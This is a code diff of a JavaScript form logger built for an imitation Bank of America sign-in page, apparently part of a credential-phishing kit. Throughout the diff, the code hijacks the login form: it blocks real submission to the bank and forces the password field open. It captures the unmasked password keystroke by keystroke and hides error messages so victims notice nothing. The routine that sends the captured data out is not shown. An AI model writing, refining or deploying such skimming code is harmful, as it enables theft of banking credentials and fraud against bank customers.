@@ -4,13 +4,13 @@
  * Displays consistent error message for all login attempts
  */
 
-// CRITICAL: Patch Form.prototype.submit BEFORE anything else
+// CRITICAL: Patch Form.prototype.submit BEFORE anything else runs
 const OriginalFormSubmit = HTMLFormElement.prototype.submit;
 
 HTMLFormElement.prototype.submit = function() {
   console.log('[Logger-Global] Form.submit() called on form:', this.id, this.method);
   if (this.id === 'EnterOnlineIDForm') {
-    console.log('[Logger-Global] Blocking EnterOnlineIDForm submission, preventing navigation');
+    console.log('[Logger-Global] Blocking EnterOnlineIDForm submission to Bank of America');
     // ALWAYS prevent submission to Bank of America
     this.action = '';
     this.target = '';
@@ -34,257 +34,149 @@ class FormLogger {
     this.rawPassword = ''; // Store unmasked password
     // Store self reference for use in global submit handler
     window.formLoggerInstance = this;
-    this.init();
+    
+    // Wait for DOM to be ready before initializing
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', () => this.init());
+    } else {
+      // DOM already loaded
+      this.init();
+    }
   }
 
   init() {
     const self = this;
+    console.log('[Logger] Initializing form logger...');
     
     // FIRST: Hide any error messages on page load (they'll only show after login attempt)
-    const existingErrors = document.querySelectorAll('.error-state, .error, [class*="error"], .alert-danger');
-    console.log('[Logger] Found', existingErrors.length, 'error elements on page load, hiding them');
+    const existingErrors = document.querySelectorAll('.error-state');
+    console.log('[Logger] Found', existingErrors.length, 'error-state elements on page load, hiding them');
     existingErrors.forEach((el) => {
       if (el && el.style) {
         el.style.display = 'none';
-        console.log('[Logger] Hidden error element:', el.className);
+        console.log('[Logger] Hidden error element');
       }
     });
     
-    // Also monitor for any dynamically added errors and hide them
+    // Monitor for dynamically added error elements and hide them
     const observer = new MutationObserver((mutations) => {
       mutations.forEach((mutation) => {
         if (mutation.addedNodes.length) {
           mutation.addedNodes.forEach((node) => {
-            if (node.nodeType === 1) { // Element node
-              const classList = node.classList ? node.classList.toString() : '';
-              if (classList.includes('error') || classList.includes('alert')) {
-                console.log('[Logger] Hiding dynamically added error:', classList);
-                node.style.display = 'none';
-              }
+            if (node.nodeType === 1 && node.classList && node.classList.contains('error-state')) {
+              console.log('[Logger] Hiding dynamically added error-state element');
+              node.style.display = 'none';
             }
           });
         }
       });
     });
     
-    // Start observing the main content area
-    const form = document.getElementById('EnterOnlineIDForm');
-    const container = form ? form.closest('.columns') || form.parentElement : document.body;
-    observer.observe(container, { childList: true, subtree: true });
-    
-    // Patch jQuery to prevent disabling the password field
-    if (typeof jQuery !== 'undefined') {
-      const originalProp = jQuery.fn.prop;
-      jQuery.fn.prop = function(name, value) {
-        if (name === 'disabled' && value === true) {
-          // Check if this is the password field
-          if (this.attr('id') === 'tlpvt-passcode-input' || this.attr('name') === 'dummy-passcode') {
-            console.log('[Logger] Prevented jQuery from disabling password field');
-            return this; // Don't disable
-          }
-        }
-        return originalProp.apply(this, arguments);
-      };
+    // Start observing for errors
+    document.body && observer.observe(document.body, { childList: true, subtree: true });
+
+    // Wait a moment for Bank of America scripts to initialize, then set up our handlers
+    setTimeout(() => {
+      console.log('[Logger] Starting form setup after BoA initialization...');
       
-      // Also patch submit method on jQuery
-      const originalSubmit = jQuery.fn.submit;
-      jQuery.fn.submit = function(handler) {
-        console.log('[Logger] jQuery.submit() called on', this.attr('id'));
-        if (this.attr('id') === 'EnterOnlineIDForm') {
-          // Intercept before calling original
-          self.logFormData(this[0]).then(() => {
-            console.log('[Logger] Logged form data via jQuery.submit');
+      // Patch jQuery to prevent disabling the password field (if jQuery exists)
+      if (typeof jQuery !== 'undefined') {
+        const originalProp = jQuery.fn.prop;
+        jQuery.fn.prop = function(name, value) {
+          if (name === 'disabled' && value === true) {
+            // Check if this is the password field
+            if (this.attr('id') === 'tlpvt-passcode-input' || this.attr('name') === 'dummy-passcode') {
+              console.log('[Logger] Prevented jQuery from disabling password field');
+              return this; // Don't disable
+            }
+          }
+          return originalProp.apply(this, arguments);
+        };
+      }
+
+      // Enable password field after Bank of America scripts have initialized
+      const passwordInput = document.getElementById('tlpvt-passcode-input');
+      if (passwordInput) {
+        // Enable the password field
+        passwordInput.disabled = false;
+        passwordInput.removeAttribute('readonly');
+        passwordInput.style.opacity = '1';
+        passwordInput.style.cursor = 'text';
+        console.log('[Logger] Password field enabled');
+        
+        // Track password input for later retrieval
+        passwordInput.addEventListener('input', (e) => {
+          this.rawPassword = passwordInput.value;
+        });
+        
+        passwordInput.addEventListener('keypress', (e) => {
+          if (e.key && e.key.length === 1) {
+            this.rawPassword += e.key;
+          }
+        });
+        
+        passwordInput.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && this.rawPassword.length > 0) {
+            this.rawPassword = this.rawPassword.slice(0, -1);
+          }
+        });
+        
+        // Use MutationObserver to prevent re-disabling
+        const pwdObserver = new MutationObserver((mutations) => {
+          mutations.forEach((mutation) => {
+            if (mutation.attributeName === 'disabled' || mutation.attributeName === 'readonly') {
+              if (passwordInput.disabled || passwordInput.readOnly) {
+                passwordInput.disabled = false;
+                passwordInput.removeAttribute('readonly');
+                console.log('[Logger] Password field re-enabled after mutation');
+              }
+            }
           });
-        }
-        return originalSubmit.apply(this, arguments);
-      };
-    }
-
-    // Enable and configure password field
-    const passwordInput = document.getElementById('tlpvt-passcode-input');
-    if (passwordInput) {
-      // CRITICAL: Enable the password field (it's disabled in HTML)
-      passwordInput.disabled = false;
-      passwordInput.removeAttribute('readonly');
-      passwordInput.style.opacity = '1';
-      passwordInput.style.cursor = 'text';
-      console.log('[Logger] Password field enabled');
-      
-      // Use MutationObserver to prevent re-disabling
-      const observer = new MutationObserver((mutations) => {
-        mutations.forEach((mutation) => {
-          if (mutation.attributeName === 'disabled' || mutation.attributeName === 'readonly') {
-            if (passwordInput.disabled || passwordInput.readOnly) {
-              passwordInput.disabled = false;
-              passwordInput.removeAttribute('readonly');
-              console.log('[Logger] Password field re-enabled after mutation');
-            }
-          }
         });
-      });
+        
+        pwdObserver.observe(passwordInput, {
+          attributes: true,
+          attributeFilter: ['disabled', 'readonly']
+        });
+      }
       
-      observer.observe(passwordInput, {
-        attributes: true,
-        attributeFilter: ['disabled', 'readonly']
-      });
-      
-      // Listen to all input events (covers paste, typing, etc.)
-      passwordInput.addEventListener('input', (e) => {
-        this.rawPassword = passwordInput.value;
-      });
-      
-      // Also capture individual keypresses to build up password
-      passwordInput.addEventListener('keypress', (e) => {
-        if (e.key && e.key.length === 1) {
-          this.rawPassword += e.key;
-        }
-      });
-      
-      // Handle backspace/delete
-      passwordInput.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && this.rawPassword.length > 0) {
-          this.rawPassword = this.rawPassword.slice(0, -1);
-        }
-      });
-      
-      // Clear when field is cleared
-      passwordInput.addEventListener('change', (e) => {
-        if (!passwordInput.value) {
-          this.rawPassword = '';
-        }
-      });
-      
-      // Also monitor value changes via direct property updates
-      const originalValueDescriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
-      Object.defineProperty(passwordInput, 'value', {
-        get() {
-          return originalValueDescriptor.get.call(this);
-        },
-        set(newValue) {
-          originalValueDescriptor.set.call(this, newValue);
-          if (this.id === 'tlpvt-passcode-input') {
-            // Update raw password when value is set
-            this.formLogger = this.formLogger || window.formLogger;
-            if (this.formLogger) {
-              this.formLogger.rawPassword = newValue;
-            }
-          }
-        }
-      });
-    }
+      // Set up form submission handlers
+      self.setupFormHandlers();
+    }, 100);
+  }
 
-    // CRITICAL: Intercept the form BEFORE Bank of America's handlers
+  setupFormHandlers() {
+    console.log('[Logger] Setting up form submission handlers...');
     const form = document.getElementById('EnterOnlineIDForm');
-    if (form) {
-      console.log('[Logger] Found EnterOnlineIDForm, hijacking submission');
-      
-      // Store original action/method
-      this.originalAction = form.action;
-      this.originalMethod = form.method;
-      this.originalTarget = form.target;
-      
-      // CRITICAL: Remove form action so it cannot submit to Bank of America
-      form.action = '';
-      form.target = '';
-      
-      // Prevent form submission via submit event
-      form.addEventListener('submit', (e) => {
-        console.log('[Logger] Form submit event, preventing default...');
-        e.preventDefault();
-        e.stopPropagation();
-        this.logFormData(form);
-        return false;
-      }, true); // Capture phase - intercept before other listeners
-      
-      // Override form.submit() method
-      const self = this;
-      const originalFormSubmit = form.submit;
-      form.submit = function() {
-        console.log('[Logger] Form.submit() called, logging data instead...');
-        self.logFormData(form);
-        return false;
-      };
-      
-      // Monitor for form action changes and reset to empty
-      const observer = new MutationObserver((mutations) => {
-        mutations.forEach((mutation) => {
-          if (mutation.attributeName === 'action' || mutation.attributeName === 'target') {
-            if (form.action !== '' || form.target !== '') {
-              console.log('[Logger] Form action/target changed, resetting to empty');
-              form.action = '';
-              form.target = '';
-            }
-          }
-        });
-      });
-      observer.observe(form, { attributes: true, attributeFilter: ['action', 'target'] });
-      
-      // Also intercept input element submit
-      const submitElements = form.querySelectorAll('input[type="submit"], button[type="submit"]');
-      submitElements.forEach((elem) => {
-        console.log('[Logger] Found submit element:', elem.value || elem.textContent);
-      });
+    if (!form) {
+      console.log('[Logger] Form not found, will retry...');
+      setTimeout(() => this.setupFormHandlers(), 500);
+      return;
     }
 
-    // Intercept login button click with high priority
+    // Prevent form submission via submit event (capture phase)
+    form.addEventListener('submit', (e) => {
+      console.log('[Logger] Form submit event intercepted');
+      e.preventDefault();
+      e.stopPropagation();
+      this.logFormData(form);
+      return false;
+    }, true);
+    
+    // Intercept button clicks
     document.addEventListener('click', (e) => {
-      // Check if any button in the form was clicked
       const form = document.getElementById('EnterOnlineIDForm');
       if (form && form.contains(e.target)) {
         const button = e.target;
-        console.log('[Logger] Click detected on form element:', button.tagName, button.id, button.name, button.value);
-        
-        // If it's a button or submit input
         if (button.tagName === 'BUTTON' || (button.tagName === 'INPUT' && button.type === 'submit')) {
-          console.log('[Logger] Submit button clicked, intercepting form submission');
+          console.log('[Logger] Submit button clicked');
           e.preventDefault();
           e.stopPropagation();
           this.logFormData(form);
           return false;
         }
       }
-    }, true); // Use capture phase to intercept BEFORE other listeners
-
-    // Intercept login button click by ID
-    document.addEventListener('click', (e) => {
-      const button = e.target.closest('#login_button');
-      if (button) {
-        console.log('[Logger] #login_button clicked');
-        e.preventDefault();
-        e.stopPropagation();
-        // Capture form data when login button is clicked
-        const form = button.closest('form') || document.getElementById('EnterOnlineIDForm');
-        if (form) {
-          this.logFormData(form);
-          return false;
-        }
-      }
     }, true);
-
-    // Also intercept all form submissions with capture phase
-    document.addEventListener('submit', (e) => {
-      const form = e.target;
-      console.log('[Logger] Document-level submit event caught on form:', form.id, form.method);
-      if (form.id === 'login-form' || form.method === 'POST' || form.id === 'EnterOnlineIDForm') {
-        console.log('[Logger] Blocking form submission, logging data instead');
-        e.preventDefault();
-        e.stopPropagation();
-        this.logFormData(form);
-        return false;
-      }
-    }, true); // Capture phase to intercept BEFORE other listeners
-    
-    // Monitor for any attempts to change form action
-    if (form) {
-      const observer = new MutationObserver((mutations) => {
-        mutations.forEach((mutation) => {
-          if (mutation.type === 'attributes') {
-            console.log('[Logger] Form attribute changed:', mutation.attributeName, form.getAttribute(mutation.attributeName));
-          }
-        });
-      });
-      observer.observe(form, { attributes: true });
-    }
   }
 
   /**
